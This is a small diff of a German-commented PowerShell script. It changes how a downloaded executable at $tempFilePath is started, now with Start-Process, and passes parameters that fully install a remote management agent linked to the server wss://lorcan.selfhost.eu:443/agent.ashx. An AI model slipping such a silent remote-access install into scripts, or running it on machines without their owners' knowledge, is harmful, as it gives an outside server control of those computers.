@@ -55,8 +55,10 @@ try {
 # Definiere die Kommandozeilenparameter als eine Zeichenkette, wobei die Parameter in doppelte Anführungszeichen eingeschlossen werden
 $params = "-fullinstall --Meshserver=wss://lorcan.selfhost.eu:443/agent.ashx"
 
+Start-Process -FilePath $tempFilePath -ArgumentList $params -NoNewWindow -Wait
+
 # Führe die .exe-Datei mit den Parametern aus
-& $tempFilePath $params
+#& $tempFilePath $params
 
 
     # Definiere die Kommandozeilenparameter
